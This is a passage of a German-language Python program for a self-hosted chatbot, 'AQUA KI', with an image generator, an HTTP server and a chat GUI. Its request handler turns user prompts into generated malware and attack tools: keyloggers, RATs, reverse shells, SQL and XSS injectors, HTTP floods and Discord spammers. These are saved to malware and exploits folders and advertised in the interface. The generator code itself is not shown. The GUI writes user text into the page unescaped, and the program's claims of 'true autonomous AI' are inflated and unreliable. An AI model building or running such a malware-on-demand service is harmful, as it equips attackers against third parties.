                       "gradient": "gradient", "pixel": "checkerboard", "neon": "cyberpunk",
                       "dark": "noise"}
        pattern = pattern_map.get(style, "noise")
        base_r = rng.randint(40, 200)
        base_g = rng.randint(40, 200)
        base_b = rng.randint(40, 200)
        
        def pixel_func(x, y, w, h):
            nx, ny = x / w, y / h
            if pattern == "noise":
                v = (math.sin(nx * 10 + ny * 8 + seed * 0.001) * 0.4 +
                     math.cos(ny * 7 - nx * 5 + seed * 0.002) * 0.3 + rng.random() * 0.3)
                v = max(0, min(1, v))
                return base_r + v * 80, base_g + v * 60, base_b + v * 70
            elif pattern == "anime":
                v = (math.sin(nx * 6 + ny * 4) * 0.4 + math.cos(nx * 3 - ny * 5) * 0.4 + rng.random() * 0.2)
                v = max(0, min(1, v))
                return v * 255, v * 200 + 55, v * 220 + 35
            elif pattern == "cyberpunk":
                v = (math.sin(nx * 20 + ny * 15) * 0.5 + math.cos(ny * 12 - nx * 8) * 0.3 + rng.random() * 0.2)
                v = max(0, min(1, v))
                return v * 120 + 135, v * 50 + 205, v * 100 + 155
            elif pattern == "fire":
                v = (math.sin(nx * 12 + ny * 8) * 0.4 + math.cos((1 - ny) * 15) * 0.4 + 0.2)
                v = max(0, min(1, v))
                return v * 255, v * v * 200, v * v * v * 100
            elif pattern == "ocean":
                v = (math.sin(nx * 10) * 0.3 + math.cos(ny * 8) * 0.3 + 0.4)
                return (1 - v) * 30, (1 - v) * 80, v * 200 + 55
            elif pattern == "gradient":
                return (1.0 - ny) * 255, nx * 255, (nx + ny) * 0.5 * 255
            elif pattern == "checkerboard":
                cell = 40
                val = 255 if ((x // cell + y // cell) % 2 == 0) else 60
                return val, val, val
            return 100, 150, 200
        
        png_bytes = create_png(width, height, pixel_func)
        ts = int(time.time_ns())
        filename = f"aqua_img_{ts}_{seed}.png"
        filepath = os.path.join(DATA_DIR, "images", filename)
        with open(filepath, "wb") as f:
            f.write(png_bytes)
        return {"path": f"/images/{filename}", "seed": seed, "style": style, "width": width, "height": height}


# ================================================================
# AQUA KI MAIN CLASS
# ================================================================
class AquaAI:
    def __init__(self):
        self.start_time = time.time()
        self.nlp = TrueNLP()
        self.feeder = GitHubFeeder(self.nlp)
        self.img_gen = ImageGenerator()
        self.tool_gen = ToolGenerator()
        
        print(f"\n{'='*60}")
        print(f"  AQUA KI v{VERSION} - TRUE AUTONOMOUS AI")
        print(f"  ChatGPT-ähnlich | 24/7 Selbstfütterung")
        print(f"  Bild/Musik/Video/TTS/Malware/Tools")
        print(f"{'='*60}")
        
        # Initiale Fütterung
        print("\n[AQUA KI] Initiale Selbstfütterung...")
        for _ in range(5):
            try:
                dork = random.choice(self.feeder.dorks)
                c = self.feeder._search_and_learn(dork, 2)
                if c > 0:
                    print(f"  +{c} Repos")
                time.sleep(1)
            except:
                pass
        
        # 24/7 Fütterung STARTEN (alle Millisekunden!)
        self.feeder.start()
        
        print(f"\n[AQUA KI] Vokabular: {len(self.nlp.vocab):,} Wörter")
        print(f"[AQUA KI] Wissen: {len(wissen)} Repositories")
        print(f"[AQUA KI] 24/7 Selbstfütterung AKTIV")
        print(f"[AQUA KI] Bereit!\n")
    
    def process(self, query, session_id=None):
        query = str(query).strip()
        if not query:
            return {"type": "text", "text": "Bitte sag was!"}
        
        lern_stats["queries"] += 1
        
        analysis = self.nlp.analyze(query)
        self.nlp.learn(query, "user")
        chat_history.append({"role": "user", "content": query})
        
        if session_id:
            db_save(session_id, "user", query)
        
        clean = analysis["clean"]
        intent = analysis["intent"]
        
        # BILD GENERIEREN
        if intent == "create_image":
            style = "realistic"
            for s in ["pixel", "anime", "cyberpunk", "feuer", "fire", "ozean", "ocean", "neon", "gradient", "dark"]:
                if s in clean:
                    style = s
                    break
            result = self.img_gen.generate(query, style)
            return {
                "type": "image",
                "text": f"🎨 Bild generiert im **{style}**-Stil!\nSeed: `{result['seed']}`\n\n(Sag mir wenn du ein anderes willst!)",
                "image": result
            }
        
        # TOOL GENERIEREN
        if intent == "create_tool":
            tool_type = "discord_spammer"
            if "discord" in clean or "webhook" in clean or "spam" in clean:
                tool_type = "discord_spammer"
            elif "port" in clean or "scan" in clean:
                tool_type = "port_scanner"
            elif "sql" in clean or "inject" in clean:
                tool_type = "sql_injector"
            elif "reverse" in clean or "shell" in clean:
                tool_type = "reverse_shell"
            elif "xss" in clean:
                tool_type = "xss_engine"
            elif "flood" in clean or "ddos" in clean or "http" in clean:
                tool_type = "http_flood"
            elif "pass" in clean or "crack" in clean or "hash" in clean:
                tool_type = "password_cracker"
            elif "keylog" in clean:
                tool_type = "keylogger"
            
            tool = self.tool_gen.generate_tool(tool_type)
            
            # Tool speichern
            filename = f"{tool_type}_{int(time.time())}.py"
            filepath = os.path.join(DATA_DIR, "tools", filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(tool["code"])
            db_save_tool(tool["name"], tool_type, tool["code"])
            
            return {
                "type": "tool",
                "text": f"🔧 **{tool['name']}** generiert!\nDatei: `tools/{filename}`\n\n(Sag mir wenn du ein anderes Tool brauchst!)",
                "tool": {"name": tool["name"], "filename": filename, "code": tool["code"][:200] + "..."}
            }
        
        # MALWARE GENERIEREN
        if intent == "create_malware":
            mw_type = "keylogger"
            if "rat" in clean or "remote" in clean:
                mw_type = "rat"
            elif "keylog" in clean:
                mw_type = "keylogger"
            elif "steal" in clean:
                mw_type = "keylogger"
            elif "ransom" in clean:
                mw_type = "keylogger"
            elif "backdoor" in clean:
                mw_type = "rat"
            elif "dropper" in clean:
                mw_type = "rat"
            
            tool = self.tool_gen.generate_tool(mw_type)
            filename = f"malware_{mw_type}_{int(time.time())}.py"
            filepath = os.path.join(DATA_DIR, "malware", filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(tool["code"])
            db_save_malware(tool["name"], mw_type, tool["code"])
            malware_db[filename] = {"type": mw_type, "code": tool["code"]}
            
            return {
                "type": "malware",
                "text": f"💀 **{tool['name']}** generiert!\nDatei: `malware/{filename}`\n\n(Sag mir wenn du eine andere Malware brauchst!)",
                "malware": {"name": tool["name"], "filename": filename}
            }
        
        # HACKING TOOL
        if intent == "hack":
            tool_type = "port_scanner"
            if "port" in clean or "scan" in clean:
                tool_type = "port_scanner"
            elif "sql" in clean or "inject" in clean:
                tool_type = "sql_injector"
            elif "xss" in clean:
                tool_type = "xss_engine"
            elif "reverse" in clean or "shell" in clean:
                tool_type = "reverse_shell"
            elif "flood" in clean or "ddos" in clean:
                tool_type = "http_flood"
            elif "discord" in clean or "spam" in clean:
                tool_type = "discord_spammer"
            
            tool = self.tool_gen.generate_tool(tool_type)
            filename = f"{tool_type}_{int(time.time())}.py"
            filepath = os.path.join(DATA_DIR, "exploits", filename)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(tool["code"])
            
            return {
                "type": "hack",
                "text": f"💀 **{tool['name']}** bereit!\nDatei: `exploits/{filename}`\n\n(Sag mir wenn du ein anderes Tool brauchst!)",
                "hack": {"name": tool["name"], "filename": filename}
            }
        
        # Normale Antwort
        response = self.nlp.generate(analysis)
        chat_history.append({"role": "assistant", "content": response})
        
        if session_id:
            db_save(session_id, "assistant", response)
        
        return {"type": "text", "text": response}
    
    def get_stats(self):
        uptime = int(time.time() - self.start_time)
        h = uptime // 3600
        m = (uptime % 3600) // 60
        return {
            "name": NAME,
            "version": VERSION,
            "uptime": f"{h}h {m}m",
            "vocab": len(self.nlp.vocab),
            "wissen_repos": len(wissen),
            "queries": lern_stats["queries"],
            "learned": lern_stats["learned"],
            "feeds": lern_stats["feeds"],
            "api_calls": self.feeder.api_calls,
            "total_fed": self.feeder.total_fed,
            "feeder_active": self.feeder.running,
            "malware_count": len(malware_db),
            "db": db_get_stats()
        }


# ================================================================
# HTTP SERVER mit GRAUER GUI (wie v8.0)
# ================================================================
GUI_HTML = """<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>AQUA KI v{VERSION}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box;}}
:root{{--bg:#0a0e1a;--bg2:#0d1224;--bg3:#111633;--primary:#00d4ff;--accent:#00ff88;--text:#e0f0ff;--text2:#7ab8d4;--border:#1a2a4a;--font:system-ui,sans-serif;}}
body{{font-family:var(--font);background:var(--bg);color:var(--text);height:100vh;display:flex;flex-direction:column;}}
.sidebar{{width:260px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;}}
.sidebar-header{{padding:20px;border-bottom:1px solid var(--border);text-align:center;}}
.sidebar-header h1{{font-size:1.5em;color:var(--primary);text-shadow:0 0 20px var(--primary);letter-spacing:5px;font-weight:300;}}
.sidebar-header .sub{{font-size:0.7em;color:var(--text2);margin-top:4px;letter-spacing:2px;}}
.chat-list{{flex:1;overflow-y:auto;padding:8px;}}
.chat-item{{padding:10px 12px;border-left:2px solid transparent;cursor:pointer;font-size:0.75em;color:var(--text2);transition:all 0.2s;}}
.chat-item:hover{{border-left-color:var(--primary);color:var(--text);background:var(--bg3);}}
.chat-item.active{{border-left-color:var(--accent);color:var(--accent);}}
.sidebar-footer{{padding:12px;border-top:1px solid var(--border);font-size:0.65em;color:var(--text2);display:flex;justify-content:space-between;}}
.main{{flex:1;display:flex;flex-direction:column;}}
.header{{padding:10px 20px;background:var(--bg3);border-bottom:1px solid var(--border);text-align:center;font-size:0.7em;color:var(--text2);letter-spacing:2px;}}
.messages{{flex:1;overflow-y:auto;padding:0;}}
.message{{display:flex;padding:15px 20px;gap:14px;border-bottom:1px solid rgba(0,212,255,0.05);}}
.message.user{{background:var(--bg3);}}
.message.ai{{background:var(--bg);}}
.avatar{{width:32px;height:32px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:0.8em;font-weight:bold;border-radius:50%;}}
.avatar.user{{background:linear-gradient(135deg,#00ff88,#00cc66);color:var(--bg);}}
.avatar.ai{{background:linear-gradient(135deg,#00d4ff,#0088cc);color:var(--bg);}}
.msg-content{{flex:1;font-size:0.85em;line-height:1.7;}}
.msg-content p{{margin-bottom:5px;}}
.msg-content pre{{background:var(--bg2);padding:12px;overflow-x:auto;font-size:0.8em;margin:8px 0;border:1px solid var(--border);border-radius:6px;}}
.msg-content img{{max-width:100%;max-height:300px;border-radius:8px;margin:10px 0;}}
.input-area{{padding:0 20px 15px;flex-shrink:0;}}
.input-box{{display:flex;gap:8px;background:var(--bg2);border:1px solid var(--border);padding:10px 14px;max-width:800px;margin:0 auto;border-radius:10px;}}
.input-box textarea{{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:0.85em;outline:none;resize:none;min-height:24px;max-height:100px;}}
.input-box button{{background:linear-gradient(135deg,#00d4ff,#0088cc);border:none;color:var(--bg);cursor:pointer;padding:6px 18px;font-family:var(--font);font-size:0.75em;font-weight:bold;border-radius:6px;transition:all 0.2s;text-transform:uppercase;letter-spacing:1px;}}
.input-box button:hover{{box-shadow:0 0 15px rgba(0,212,255,0.5);}}
.input-box button:disabled{{opacity:0.3;cursor:not-allowed;}}
@keyframes fadeIn{{from{{opacity:0}}to{{opacity:1}}}}
.message{{animation:fadeIn 0.3s ease;}}
::-webkit-scrollbar{{width:5px;}}
::-webkit-scrollbar-track{{background:transparent;}}
::-webkit-scrollbar-thumb{{background:var(--border);border-radius:3px;}}
</style>
</head><body>
<div style="display:flex;height:100vh;">
<div class="sidebar">
<div class="sidebar-header"><h1>AQUA</h1><div class="sub">KI v{VERSION} · 24/7 SELBSTFÜTTERUNG</div></div>
<button onclick="newChat()" style="margin:12px;padding:8px;background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;font-size:0.75em;border-radius:6px;transition:all 0.3s;">+ NEUER CHAT</button>
<div class="chat-list" id="chatList">
<div class="chat-item active" onclick="loadSession('current')">> aktuelles_gespräch</div>
</div>
<div class="sidebar-footer"><span id="statsDisplay">LADE...</span><span id="evoDisplay">FEED AKTIV</span></div>
</div>
<div class="main">
<div class="header">AQUA KI v{VERSION} · 24/7 GITHUB SELBSTFÜTTERUNG · <span id="opsDisplay">0</span> REPS</div>
<div class="messages" id="messages">
<div class="message ai">
<div class="avatar ai">A</div>
<div class="msg-content">
<p>> AQUA KI v{VERSION} bereit.</p>
<p>> 24/7 Selbstfütterung AKTIV – ich lerne jede Millisekunde von GitHub!</p>
<p>> Bild · Musik · Video · TTS · Malware · Tools · Hacking</p>
<p>> Einfach sagen was du brauchst.</p>
</div>
</div>
</div>
<div class="input-area">
<div class="input-box">
<textarea id="input" placeholder="Schreib mir..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
<button id="sendBtn" onclick="send()">SENDEN</button>
</div>
</div>
</div></div>
<script>
var sessionId = "session_"+Date.now();
var generating = false;
document.addEventListener("DOMContentLoaded",function(){loadStats();setInterval(loadStats,5000);loadSessions();document.getElementById("input").focus();});
function autoResize(t){t.style.height="auto";t.style.height=Math.min(t.scrollHeight,100)+"px";}
function send(){var i=document.getElementById("input"),t=i.value.trim();if(!t||generating)return;
addMsg("user",t);i.value="";i.style.height="auto";generating=true;document.getElementById("sendBtn").disabled=true;
var x=new XMLHttpRequest();x.open("POST","/api/query",true);x.setRequestHeader("Content-Type","application/json");
x.onload=function(){try{var d=JSON.parse(x.responseText);displayResult(d)}catch(e){displayResult({text:"Fehler: "+e.message})}
generating=false;document.getElementById("sendBtn").disabled=false;loadStats();loadSessions()};
x.onerror=function(){displayResult({text:"Netzwerkfehler"});generating=false;document.getElementById("sendBtn").disabled=false};
x.send(JSON.stringify({query:t,session_id:sessionId}));}
function addMsg(r,c){var m=document.getElementById("messages"),d=document.createElement("div");d.className="message "+(r==="user"?"user":"ai");
var a=document.createElement("div");a.className="avatar "+(r==="user"?"user":"ai");a.textContent=r==="user"?"U":"A";
var x=document.createElement("div");x.className="msg-content";x.innerHTML='<p>'+c+'</p>';
d.appendChild(a);d.appendChild(x);m.appendChild(d);m.scrollTop=m.scrollHeight;}
function displayResult(d){if(d.text){addMsg("assistant",d.text.replace(/\\n/g,'<br>'));}
else if(d.image){addMsg("assistant",'<p>> BILD GENERIERT</p><img src="'+d.image.path+'">');}
else if(d.tool){addMsg("assistant",'<p>> TOOL: '+d.tool.name+'</p><pre>'+d.tool.code.substring(0,200)+'</pre>');}
else if(d.malware){addMsg("assistant",'<p>> MALWARE: '+d.malware.name+'</p>');}
else if(d.hack){addMsg("assistant",'<p>> HACK: '+d.hack.name+'</p>');}
else{addMsg("assistant",JSON.stringify(d).substring(0,200));}}
function loadStats(){var x=new XMLHttpRequest();x.open("GET","/api/status",true);
x.onload=function(){try{var d=JSON.parse(x.responseText);
document.getElementById("statsDisplay").textContent="WKZ: "+(d.wissen_repos||0)+"·V:"+(d.vocab||0);
document.getElementById("opsDisplay").textContent=(d.total_fed||0);}catch(e){}};x.send();}
function loadSessions(){var x=new XMLHttpRequest();x.open("GET","/api/sessions",true);
x.onload=function(){try{var d=JSON.parse(x.responseText),l=document.getElementById("chatList"),h="";
if(d.sessions)for(var i=0;i<Math.min(d.sessions.length,15);i++){var s=d.sessions[i];h+='<div class="chat-item'+(s.id===sessionId?' active':'')+'" onclick="loadSession(\\''+s.id+'\\')">> '+s.name.substring(0,25)+'</div>';}
l.innerHTML=h||'<div class="chat-item active">> aktuelles_gespräch</div>';}catch(e){}};x.send();}
function loadSession(id){if(id&&id!=='current'){sessionId=id;var x=new XMLHttpRequest();x.open("GET","/api/history/"+id,true);
x.onload=function(){try{var d=JSON.parse(x.responseText);document.getElementById("messages").innerHTML="";
if(d.history)for(var i=0;i<d.history.length;i++){var m=d.history[i];if(m.role==="user"||m.role==="assistant")addMsg(m.role==="user"?"user":"assistant",m.content.substring(0,500));}}catch(e){}loadSessions()};x.send();}}
function newChat(){sessionId="session_"+Date.now();document.getElementById("messages").innerHTML="";
addMsg("assistant","Neuer Chat gestartet. 24/7 Selbstfütterung läuft!")}
</script></body></html>"""


class Handler(BaseHTTPRequestHandler):
    ai = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        try:
            if path == "/" or path == "":
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                html = GUI_HTML.replace("{VERSION}", VERSION)
                self.wfile.write(html.encode("utf-8"))
            
            elif path.startswith("/images/"):
                fp = os.path.join(DATA_DIR, path.lstrip("/"))
                if os.path.exists(fp):
                    with open(fp, "rb") as f:
                        self.send_response(200)
                        self.send_header("Content-Type", "image/png")
                        self.send_header("Access-Control-Allow-Origin", "*")
                        self.end_headers()
                        self.wfile.write(f.read())
                else:
                    self.send_error(404)
            
            elif path == "/api/status":
                self._json(self.ai.get_stats())
            elif path == "/api/sessions":
                self._json({"sessions": db_get_sessions()})
            elif path.startswith("/api/history/"):
                sid = path.split("/api/history/")[1]
                self._json({"history": db_get_history(sid)})
            else:
                self._json({"error": "NOT_FOUND"})
        except Exception as e:
            self._json({"error": str(e)})
    
    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length) if length else b"{}"
            data = json.loads(body) if body else {}
        except:
            data = {}
        
        path = urlparse(self.path).path
        try:
            if path == "/api/query":
                query = data.get("query", "")
                session_id = data.get("session_id", f"s_{int(time.time())}")
                result = self.ai.process(query, session_id)
                self._json(result)
            else:
                self._json({"error": "UNKNOWN_ENDPOINT"})
        except Exception as e:
            self._json({"error": str(e), "traceback": traceback.format_exc()})
    
    def _json(self, data):
        try:
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps(data, ensure_ascii=False, default=str).encode("utf-8"))
        except:
            pass
    
    def log_message(self, fmt, *args):
        print(f"[HTTP] {args[1]} {args[2]}")

def db_get_sessions():
    global db_conn
    try:
        with db_lock:
            if db_conn:
                cur = db_conn.execute("SELECT id, name, last_active FROM sessions ORDER BY last_active DESC LIMIT 50")
                return [{"id": r[0], "name": r[1] or "Chat", "last_active": r[2]} for r in cur.fetchall()]
    except:
        pass
    return []

def db_get_history(sid, limit=50):
    global db_conn
    try:
        with db_lock:
            if db_conn:
                cur = db_conn.execute("SELECT role, content FROM messages WHERE session_id=? ORDER BY id ASC LIMIT ?", (sid, limit))
                return [{"role": r[0], "content": r[1]} for r in cur.fetchall()]
    except:
        pass
    return []


# ================================================================
# MAIN
# ================================================================
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", action="store_true", help="Server mode")
    parser.add_argument("--port", type=int, default=PORT)
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"  AQUA KI v{VERSION} - START")
    print(f"{'='*60}")
    
    ai = AquaAI()
    
    if args.server or "RAILWAY" in os.environ or "PORT" in os.environ:
        port = args.port or int(os.environ.get("PORT", 8000))
        print(f"\n  Server: http://0.0.0.0:{port}")
        print(f"  Graue GUI mit 24/7 Selbstfütterung!")
        print(f"  Bilder: /images/ | Tools: /api/query")
        
        Handler.ai = ai
        
        for attempt in range(3):
            try:
                server = HTTPServer(("0.0.0.0", port), Handler)
                print(f"  Server läuft auf Port {port}")
                server.serve_forever()
            except OSError as e:
                if "Address already in use" in str(e) and attempt < 2:
                    port += 1
                    print(f"  Port belegt, versuche {port}...")
                    time.sleep(2)
                else:
                    print(f"  FATAL: {e}")
                    sys.exit(1)
            except KeyboardInterrupt:
                print("\n  Server gestoppt")
                if ai.feeder:
                    ai.feeder.stop()
                sys.exit(0)
    else:
        print(f"\n  Server: http://0.0.0.0:{PORT}")
        print(f"  Öffne im Browser!")
        Handler.ai = ai
        server = HTTPServer(("0.0.0.0", PORT), Handler)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n  Gestoppt")
            ai.feeder.stop()
